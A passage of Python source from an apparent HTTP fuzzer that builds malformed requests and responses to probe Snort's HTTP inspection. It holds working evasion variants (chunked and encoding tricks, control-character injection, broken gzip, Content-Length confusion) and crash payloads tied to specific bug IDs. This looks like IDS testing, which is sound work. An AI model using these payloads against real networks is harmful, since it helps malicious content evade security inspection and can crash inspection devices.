            return (head + b"Connection: Upgrade\r\nUpgrade: h2c, websocket, "
                    + (b"proto/" + b"x" * 2000) + b"\r\n\r\n")
        if variant == "authorization_b64":
            # Basic auth — the value is base64 that some inspectors decode.
            return head + b"Authorization: Basic " + (b"QUFB" * 4000) + b"\r\n\r\n"
        if variant == "authorization_junk":
            return head + b"Authorization: Basic !!!not-base64===\r\n\r\n"
        if variant == "accept_encoding_many":
            enc = b", ".join(b"enc%d;q=0.%d" % (i, i % 10) for i in range(2000))
            return head + b"Accept-Encoding: " + enc + b"\r\n\r\n"
        if variant == "cache_control":
            return head + b"Cache-Control: max-age=99999999999999999999, no-cache, " \
                          b"private, " + (b"x" * 4000) + b"\r\n\r\n"
        # max_forwards_huge — OPTIONS/TRACE hop counter integer torture.
        return (b"OPTIONS * HTTP/1.1\r\n" + _HOST +
                b"Max-Forwards: 999999999999999999999\r\n\r\n")

    else:
        # Fallback: a benign, valid request.
        return b"GET / HTTP/1.1\r\n" + _HOST + b"\r\n"


def build_http_response(strategy: str, payload_override=None) -> bytes:
    """
    Build a (possibly malformed) HTTP RESPONSE modelling the HTTP Evader
    semantic-gap evasions. Delivered server->client so Snort's http_inspect
    response parser / body-extraction path is exercised. The hidden body is a
    benign marker standing in for the content a real attacker would smuggle.
    """
    m = payload_override if payload_override is not None else _MARKER

    if strategy == "resp_http09":
        # Part 1: HTTP/0.9 — no status line, no headers, just the body, ended by
        # TCP close. Many devices pass it through entirely un-inspected.
        variant = random.choice(["bare", "html", "binary_marker"])
        if variant == "html":
            return b"<html><body>" + m + b"</body></html>"
        if variant == "binary_marker":
            return b"MZ\x90\x00" + m          # looks like a PE download
        return m + b"\n"

    elif strategy == "resp_deflate_ambiguity":
        # Part 2: 'deflate' means zlib(RFC1950) OR raw(RFC1951); products differ
        # on which (or neither) they decode.
        variant = random.choice([
            "raw1951", "zlib1950", "gzip_as_deflate", "truncated_zlib", "x_deflate"])
        enc = b"deflate"
        if variant == "raw1951":
            body = _raw_deflate(m)
        elif variant == "zlib1950":
            body = _zlib_deflate(m)
        elif variant == "gzip_as_deflate":
            body = _gzip_blob(m)              # says deflate, actually gzip
        elif variant == "truncated_zlib":
            body = _zlib_deflate(m)[:-4]      # drop adler-32 checksum
        else:                                # x-deflate alias
            enc = b"x-deflate"
            body = _zlib_deflate(m)
        return (b"HTTP/1.1 200 OK\r\nContent-Encoding: " + enc +
                b"\r\nContent-Length: %d\r\n\r\n" % len(body)) + body

    elif strategy == "resp_chunked_evasion":
        # Part 3 + Part 10 + Chunked.pm/Broken.pm: Transfer-Encoding chunked
        # tricks, chunk-size parsing, and hiding the TE header itself.
        variant = random.choice([
            "te_and_cl", "te_and_cl_double", "http10_chunked", "dup_te", "triple_te",
            "value_xchunked", "value_space_chunked", "value_chunked_foo", "mixed_case",
            "chunked_semicolon", "cr_chunked", "chunked_cr", "fold_in_token",
            "ce_chunked", "chunk_ext", "chunksize_0x", "chunksize_negative",
            "chunksize_ws", "chunksize_caps",
        ])
        ck = _chunk(m)
        OK = b"HTTP/1.1 200 OK\r\n"
        TE = b"Transfer-Encoding: chunked\r\n\r\n"
        if variant == "te_and_cl":
            # Spec: chunked wins, CL ignored. ~15% of firewalls do the opposite.
            return OK + b"Transfer-Encoding: chunked\r\nContent-Length: 9\r\n\r\n" + ck
        if variant == "te_and_cl_double":
            # chunked + a Content-Length of DOUBLE the real size, served chunked.
            return (OK + b"Transfer-Encoding: chunked\r\nContent-Length: %d\r\n\r\n"
                    % (len(m) * 2)) + ck
        if variant == "http10_chunked":
            # chunked is HTTP/1.1-only; browsers ignore it on 1.0, ~40% of fw don't.
            return (b"HTTP/1.0 200 OK\r\n" + TE) + ck
        if variant == "dup_te":
            return (OK + b"Transfer-Encoding: foo\r\nTransfer-Encoding: chunked\r\n\r\n") + ck
        if variant == "triple_te":
            # junk, then chunked, then junk again — order-dependent parsers differ.
            return (OK + b"Transfer-Encoding: foo\r\nTransfer-Encoding: chunked\r\n"
                    b"Transfer-Encoding: bar\r\n\r\n") + ck
        if variant == "value_xchunked":
            return (OK + b"Transfer-Encoding: xchunked\r\n\r\n") + ck
        if variant == "value_space_chunked":
            return (OK + b"Transfer-Encoding: x chunked\r\n\r\n") + ck
        if variant == "value_chunked_foo":
            return (OK + b"Transfer-Encoding: chunked foo\r\n\r\n") + ck
        if variant == "mixed_case":
            return (OK + b"Transfer-Encoding: chUnked\r\n\r\n") + ck
        if variant == "chunked_semicolon":
            return (OK + b"Transfer-Encoding: chunked;\r\n\r\n") + ck
        if variant == "cr_chunked":
            # Transfer-Encoding:<CR>chunked  (bare CR inside the value)
            return (OK + b"Transfer-Encoding:\rchunked\r\n\r\n") + ck
        if variant == "chunked_cr":
            # Transfer-Encoding:chunked<CR><space>
            return (OK + b"Transfer-Encoding: chunked\r \r\n\r\n") + ck
        if variant == "fold_in_token":
            # CRLF-fold INSIDE the value token: "chu\r\n nked"
            return (OK + b"Transfer-Encoding: chu\r\n nked\r\n\r\n") + ck
        if variant == "ce_chunked":
            # chunked declared via Content-Encoding instead of Transfer-Encoding.
            return (OK + b"Content-Encoding: chunked\r\n\r\n") + ck
        if variant == "chunk_ext":
            ext = b"%x;ext=%s\r\n%s\r\n0\r\n\r\n" % (len(m), b"a" * 200, m)
            return (OK + TE) + ext
        if variant == "chunksize_0x":
            return (OK + TE) + b"0x%x\r\n%s\r\n0\r\n\r\n" % (len(m), m)
        if variant == "chunksize_negative":
            return (OK + TE) + b"-%x\r\n%s\r\n0\r\n\r\n" % (len(m), m)
        if variant == "chunksize_caps":
            return (OK + TE) + b"%X\r\n%s\r\n0\r\n\r\n" % (len(m), m)
        # chunksize_ws — leading \t/space/vtab before the size (Firefox strtoul)
        return (OK + TE) + b"\t\x0b %x\r\n%s\r\n0\r\n\r\n" % (len(m), m)

    elif strategy == "resp_double_encoding":
        # Part 4 + Compressed.pm: stacked/odd Content-Encoding. Most devices
        # decompress only once, ignore unknown layers, or mis-handle identity.
        OK = b"HTTP/1.1 200 OK\r\n"

        def _ce_resp(headers: bytes, body: bytes) -> bytes:
            return OK + headers + b"Content-Length: %d\r\n\r\n" % len(body) + body

        variant = random.choice([
            "deflate_gzip", "deflate_deflate", "gzip_gzip", "two_headers",
            "gzip_zlib", "identity_gzip", "ce_identity", "comma_trailing",
            "declared_double_served_single", "wrong_order", "xfoo_nl_inject"])
        if variant == "deflate_gzip":
            body = _gzip_blob(_raw_deflate(m))
            return _ce_resp(b"Content-Encoding: deflate, gzip\r\n", body)
        if variant == "deflate_deflate":
            body = _raw_deflate(_raw_deflate(m))
            return _ce_resp(b"Content-Encoding: deflate, deflate\r\n", body)
        if variant == "gzip_gzip":
            body = _gzip_blob(_gzip_blob(m))
            return _ce_resp(b"Content-Encoding: gzip, gzip\r\n", body)
        if variant == "two_headers":
            body = _gzip_blob(_raw_deflate(m))
            return _ce_resp(b"Content-Encoding: deflate\r\nContent-Encoding: gzip\r\n", body)
        if variant == "gzip_zlib":
            # gzip 10-byte header but the payload is zlib (RFC1950), not raw deflate.
            body = b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff" + _zlib_deflate(m)
            return _ce_resp(b"Content-Encoding: gzip\r\n", body)
        if variant == "identity_gzip":
            # 'identity' (which is invalid in Content-Encoding) stacked before gzip.
            body = _gzip_blob(m)
            return _ce_resp(b"Content-Encoding: identity\r\nContent-Encoding: gzip\r\n", body)
        if variant == "ce_identity":
            return _ce_resp(b"Content-Encoding: identity\r\n", m)
        if variant == "comma_trailing":
            # "Content-Encoding: gzip," — trailing comma / empty token.
            body = _gzip_blob(m)
            return _ce_resp(b"Content-Encoding: gzip,\r\n", body)
        if variant == "declared_double_served_single":
            # Two gzip headers declared, but body only gzipped ONCE: a device that
            # trusts the headers will inflate twice and fail / mis-handle.
            body = _gzip_blob(m)
            return _ce_resp(b"Content-Encoding: gzip\r\nContent-Encoding: gzip\r\n", body)
        if variant == "wrong_order":
            # Header says gzip,deflate but body is compressed deflate-then-gzip.
            body = _gzip_blob(_raw_deflate(m))
            return _ce_resp(b"Content-Encoding: gzip, deflate\r\n", body)
        # xfoo_nl_inject — bare \n / \r in an injected header between the two CE
        # headers (works around signature rules keyed on adjacent CE headers).
        body = _gzip_blob(_raw_deflate(m))
        sep = random.choice([b"\n", b"\r"])
        return _ce_resp(b"Content-Encoding: gzip\r\nX-Foo:" + sep +
                        b"Content-Encoding: deflate\r\n", body)

    elif strategy == "resp_gzip_quirks":
        # Part 5: browsers skip gzip validation; devices that can't unpack the
        # "broken" stream forward it un-analysed.
        variant = random.choice([
            "bad_crc", "bad_isize", "trunc4", "trunc8", "reserved_bits",
            "fname", "fcomment", "fhcrc", "ftext", "raw_after"])
        if variant == "bad_crc":
            body = _make_gzip(m, crc_ok=False)
        elif variant == "bad_isize":
            body = _make_gzip(m, isize_ok=False)
        elif variant == "trunc4":
            body = _make_gzip(m, trunc=4)
        elif variant == "trunc8":
            body = _make_gzip(m, trunc=8)
        elif variant == "reserved_bits":
            body = _make_gzip(m, flg=0xE0)
        elif variant == "fname":
            body = _make_gzip(m, fname=b"invoice.pdf.exe")
        elif variant == "fcomment":
            body = _make_gzip(m, fcomment=b"nothing to see here")
        elif variant == "fhcrc":
            body = _make_gzip(m, fhcrc=True)
        elif variant == "ftext":
            body = _make_gzip(m, flg=0x01)
        else:  # raw_after — Chrome treats trailing bytes after gzip as body
            body = _make_gzip(m, raw_after=b"|RAW-TRAILER|" + m)
        return (b"HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\n"
                b"Content-Length: %d\r\n\r\n" % len(body)) + body

    elif strategy == "resp_whitespace_evasion":
        # Part 6: misuse of white-space around headers / line endings.
        variant = random.choice([
            "obs_fold", "lf_fold", "bare_lf", "bare_cr_sep", "leading_blank",
            "space_before_status", "space_before_colon"])
        ck = _chunk(m)
        if variant == "obs_fold":
            return (b"HTTP/1.1 200 OK\r\nTransfer-Encoding:\r\n chunked\r\n\r\n") + ck
        if variant == "lf_fold":
            return (b"HTTP/1.1 200 OK\r\nTransfer-Encoding:\n chunked\r\n\r\n") + ck
        if variant == "bare_lf":
            return (b"HTTP/1.1 200 OK\nTransfer-Encoding: chunked\n\n") + ck
        if variant == "bare_cr_sep":
            return (b"HTTP/1.1 200 OK\rTransfer-Encoding: chunked\r\n\r\n") + ck
        if variant == "leading_blank":
            return (b"\r\nHTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n") + ck
        if variant == "space_before_status":
            return (b" HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n") + ck
        # space_before_colon (Chrome/Opera accept)
        return (b"HTTP/1.1 200 OK\r\nTransfer-Encoding : chunked\r\n\r\n") + ck

    elif strategy == "resp_lucky_status":
        # Part 7: status codes used in unexpected ways / invalid codes that
        # browsers still treat as a downloadable success.
        variant = random.choice([
            "100", "302_no_location", "401_no_auth", "500", "502",
            "204_with_body", "0200", "code_2", "code_20x", "code_2xx",
            "code_000", "code_600"])
        codes = {
            "100": b"100 Continue", "302_no_location": b"302 Found",
            "401_no_auth": b"401 Unauthorized", "500": b"500 Internal Server Error",
            "502": b"502 Bad Gateway", "204_with_body": b"204 No Content",
            "0200": b"0200 OK", "code_2": b"2 OK", "code_20x": b"20x OK",
            "code_2xx": b"2xx OK", "code_000": b"000 OK", "code_600": b"600 OK",
        }
        status = codes[variant]
        return (b"HTTP/1.1 " + status + b"\r\n"
                b"Content-Type: application/octet-stream\r\n"
                b"Content-Length: %d\r\n\r\n" % len(m)) + m

    elif strategy == "resp_nul_injection":
        # Part 8 + 10 + Broken.pm: control characters that browsers tolerate but
        # devices mis-handle, injected around/inside the Transfer-Encoding header.
        # \x00 NUL, \x0b VT, \x0c FF, \xa0 Latin-1 NBSP, \x7f DEL,
        # \xef\xbb\xbf UTF-8 BOM, \xc2\x84 UTF-8 NBSP.
        ck = _chunk(m)
        OK = b"HTTP/1.1 200 OK\r\n"
        ctl = random.choice([b"\x00", b"\x0b", b"\x0c", b"\xa0", b"\x7f"])
        variant = random.choice([
            "name_ctl", "value_inner_ctl", "value_prefix_ctl", "value_suffix_ctl",
            "status_nul", "scattered_nul", "around_colon", "bom_prefix",
            "utf8_nbsp_prefix", "comma_prefix", "semicolon_prefix",
            "junk_line_before", "ctl_only_line_before"])
        if variant == "name_ctl":
            return (OK + b"Transfer" + ctl + b"-Encoding: chunked\r\n\r\n") + ck
        if variant == "value_inner_ctl":
            return (OK + b"Transfer-Encoding: chu" + ctl + b"nked\r\n\r\n") + ck
        if variant == "value_prefix_ctl":
            return (OK + b"Transfer-Encoding:" + ctl + b"chunked\r\n\r\n") + ck
        if variant == "value_suffix_ctl":
            return (OK + b"Transfer-Encoding: chunked" + ctl + b"\r\n\r\n") + ck
        if variant == "status_nul":
            return (b"HTTP/1\x00.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n") + ck
        if variant == "scattered_nul":
            return (b"\x00HTTP/1.1 200 OK\r\n"
                    b"\x00Transfer-\x00Encoding\x00:\x00chunked\x00\r\n\r\n") + ck
        if variant == "around_colon":
            # "Transfer-Encoding<VT/FF/ws>:chunked"
            return (OK + b"Transfer-Encoding" + ctl + b":chunked\r\n\r\n") + ck
        if variant == "bom_prefix":
            return (OK + b"Transfer-Encoding:\xef\xbb\xbfchunked\r\n\r\n") + ck
        if variant == "utf8_nbsp_prefix":
            return (OK + b"Transfer-Encoding:\xc2\x84chunked\r\n\r\n") + ck
        if variant == "comma_prefix":
            return (OK + b"Transfer-Encoding:,chunked\r\n\r\n") + ck
        if variant == "semicolon_prefix":
            return (OK + b"Transfer-Encoding:;chunked\r\n\r\n") + ck
        if variant == "junk_line_before":
            # An ASCII junk line without a colon before the real header.
            return (OK + b"this-is-junk-without-colon\r\n"
                    b"Transfer-Encoding: chunked\r\n\r\n") + ck
        # ctl_only_line_before — a line containing only a control char, then TE
        return (OK + ctl + b"\r\nTransfer-Encoding: chunked\r\n\r\n") + ck

    elif strategy == "resp_version_confusion":
        # Part 8 + 10: status-line version robustness.
        variant = random.choice([
            "lowercase", "http20", "http12", "http101", "http1010",
            "junk_after", "hTTp", "icy"])
        lines = {
            "lowercase": b"http/1.1 200 OK",
            "http20": b"HTTP/2.0 200 OK",
            "http12": b"HTTP/1.2 200 OK",
            "http101": b"HTTP/1.01 200 OK",
            "http1010": b"HTTP/1.010 200 OK",
            "junk_after": b"HTTP/1.1foobar 200 OK",
            "hTTp": b"hTTp/1.1 200 OK",
            "icy": b"ICY 200 OK",
        }
        return (lines[variant] + b"\r\nTransfer-Encoding: chunked\r\n\r\n") + _chunk(m)

    elif strategy == "resp_header_end":
        # Part 8: different interpretations of where the header ends.
        variant = random.choice(["lf_lf", "tab_empty", "swapped", "double_colon"])
        gz = _gzip_blob(m)
        if variant == "lf_lf":
            return (b"HTTP/1.1 200 OK\nContent-Encoding: gzip\n\n") + gz
        if variant == "tab_empty":
            # IE/Edge accept SP/TAB inside the "empty" terminating line.
            return (b"HTTP/1.1 200 OK\r\nContent-Encoding: gzip\r\n\t\r\n") + gz
        if variant == "swapped":
            # \n\r\r\n header-end (accepted by IE/Edge/Safari)
            return (b"HTTP/1.1 200 OK\r\nContent-Encoding: gzip\n\r\r\n") + gz
        # double_colon: Transfer-Encoding::chunked (FF/Safari treat as chunked)
        return (b"HTTP/1.1 200 OK\r\nTransfer-Encoding::chunked\r\n\r\n") + _chunk(m)

    elif strategy == "resp_content_length":
        # Clen.pm: response Content-Length parsing tricks. The body is the marker
        # followed by junk; a device that mis-parses the length sees a different
        # body boundary than the browser.
        OK = b"HTTP/1.1 200 OK\r\nConnection: close\r\n"
        n = len(m)
        body = m + b"|TRAILING-JUNK-AFTER-DECLARED-LENGTH|"
        variant = random.choice([
            "double", "half", "semicolon_after", "semicolon_before", "comma_after",
            "quoted", "alpha_suffix", "alpha_prefix", "space_suffix", "nbsp_prefix",
            "decimal", "nul_inside", "hex", "overflow32", "huge", "big_1gb",
            "zero_pad", "empty", "invalid"])
        if variant == "double":
            cl = b"%d" % (n * 2)
        elif variant == "half":
            cl = b"%d" % (n // 2)
        elif variant == "semicolon_after":
            cl = b"%d;" % n
        elif variant == "semicolon_before":
            cl = b";%d" % n
        elif variant == "comma_after":
            cl = b"%d,%d" % (n, n)
        elif variant == "quoted":
            cl = b'"%d"' % n
        elif variant == "alpha_suffix":
            cl = b"%dA" % n
        elif variant == "alpha_prefix":
            cl = b"A%d" % n
        elif variant == "space_suffix":
            cl = b"%d A" % n
        elif variant == "nbsp_prefix":
            cl = b"\xa0%d" % n          # Latin-1 NBSP before the digits
        elif variant == "decimal":
            cl = b"%d.9" % n
        elif variant == "nul_inside":
            s = b"%d" % n
            cl = s[:-1] + b"\x00" + s[-1:]
        elif variant == "hex":
            cl = b"0x%x" % n
        elif variant == "overflow32":
            cl = b"%d" % (2 ** 32 + n)
        elif variant == "huge":
            cl = b"9999999999999999999999"
        elif variant == "big_1gb":
            cl = b"1073741824"
        elif variant == "zero_pad":
            cl = (b"0" * 1000) + b"%d" % n
        elif variant == "empty":
            cl = b""
        else:  # invalid
            cl = b"xxx"
        return OK + b"Content-Length: " + cl + b"\r\n\r\n" + body

    # ---- PARTIAL HEADER + CLOSE (CSCwu90024) ----
    if strategy == "partial_header_close":
        variant = random.choice([
            "truncated_request_line", "partial_host_header",
            "truncated_chunked_header", "partial_content_length",
            "header_flood_then_close",
        ])
        if variant == "truncated_request_line":
            partials = []
            for _ in range(200):
                cut = random.randint(4, 25)
                partials.append(b"GET /index.html HTTP/1.1\r\n"[:cut])
            return b"".join(partials)
        elif variant == "partial_host_header":
            lines = []
            for _ in range(200):
                cut = random.randint(1, 15)
                lines.append(b"GET / HTTP/1.1\r\nHost: example"[:-(16-cut)])
            return b"".join(lines)
        elif variant == "truncated_chunked_header":
            lines = []
            for _ in range(200):
                hdr = (b"POST /upload HTTP/1.1\r\nHost: t\r\n"
                       b"Transfer-Encoding: chunked\r\n")
                cut = random.randint(len(hdr) - 20, len(hdr) - 1)
                lines.append(hdr[:cut])
            return b"".join(lines)
        elif variant == "partial_content_length":
            lines = []
            for _ in range(200):
                hdr = (b"POST /api HTTP/1.1\r\nHost: t\r\n"
                       b"Content-Length: 100\r\n\r\n")
                cut = random.randint(len(hdr) - 15, len(hdr) - 1)
                lines.append(hdr[:cut])
            return b"".join(lines)
        else:
            lines = []
            for _ in range(100):
                hdr = b"GET / HTTP/1.1\r\n"
                for j in range(random.randint(5, 50)):
                    hdr += b"X-Fuzz-%d: %s\r\n" % (j, b"A" * random.randint(10, 200))
                lines.append(hdr)
            return b"".join(lines)

    # ---- RESP: JS NORMALIZATION CRASH (CSCwu24006, CSCwu24015) ----
    if strategy == "resp_js_normalization_crash":
        OK = b"HTTP/1.1 200 OK\r\n"
        variant = random.choice([
            "malformed_script_tag", "deeply_nested_js",
            "invalid_unicode_js", "huge_js_body",
            "script_with_nul", "mixed_encoding_js",
        ])
        if variant == "malformed_script_tag":
            js = b"<script>" + b"var x=" * 5000 + b"'\\u{FFFFFF}';" * 1000 + b"</script>"
            return (OK + b"Content-Type: text/html\r\n"
                    b"Content-Length: %d\r\n\r\n" % len(js)) + js
        elif variant == "deeply_nested_js":
            js = b"<script>" + b"(function(){" * 500 + b"alert(1)" + b"})()" * 500 + b"</script>"
            return (OK + b"Content-Type: text/html\r\n"
                    b"Content-Length: %d\r\n\r\n" % len(js)) + js
        elif variant == "invalid_unicode_js":
            js = b"<script>var s='" + b"\\uD800\\uDBFF\\uDFFF" * 2000 + b"';</script>"
            return (OK + b"Content-Type: text/html; charset=utf-8\r\n"
                    b"Content-Length: %d\r\n\r\n" % len(js)) + js
        elif variant == "huge_js_body":
            js = b"<script>" + b"x" * 60000 + b"</script>"
            return (OK + b"Content-Type: text/html\r\n"
                    b"Content-Length: %d\r\n\r\n" % len(js)) + js
        elif variant == "script_with_nul":
            js = b"<script>var a='" + (b"A\x00B" * 3000) + b"';</script>"
            return (OK + b"Content-Type: text/html\r\n"
                    b"Content-Length: %d\r\n\r\n" % len(js)) + js
        else:
            js_parts = []
            for _ in range(500):
                js_parts.append(b"<script>eval('\\x" +
                               b"'.join([b'%02x' % random.randint(0, 255)])" +
                               b"');</script>")
            js = b"".join(js_parts)
            return (OK + b"Content-Type: text/html\r\n"
                    b"Content-Length: %d\r\n\r\n" % len(js)) + js

    # Fallback: a plain, valid 200 response.
    return (b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
            b"Content-Length: %d\r\n\r\n" % len(m)) + m


class HttpMutator:
    def __init__(self, external_weights: dict = None, bandit=None):
        self.strategies = HTTP_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return HTTP_WEIGHTS

    def mutate(self, payload_override=None) -> tuple:
        """Returns (payload_bytes, strategy_name)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload = build_http_payload(strategy, payload_override=payload_override)
        return payload, strategy
